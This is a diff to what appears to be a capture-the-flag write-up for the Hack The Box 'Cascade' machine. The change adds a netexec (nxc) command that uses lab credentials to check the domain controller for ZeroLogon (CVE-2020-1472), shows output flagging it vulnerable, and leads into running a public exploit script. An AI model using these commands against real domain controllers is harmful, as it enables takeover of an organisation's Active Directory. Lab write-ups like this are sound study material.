@@ -264,7 +264,15 @@ C:\Windows\system32>
 
 
 ## ZeroLogon
-Past expience also tells me this version can be vulnerable to zerologon
+Past experience also tells me this version can be vulnerable to zerologon
+
+```python
+nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva' -M zerologon
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+ZEROLOGON   10.129.18.9     445    CASC-DC1         VULNERABLE
+ZEROLOGON   10.129.18.9     445    CASC-DC1         Next step: https://github.com/dirkjanm/CVE-2020-1472
+```
 
 ```python
 python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
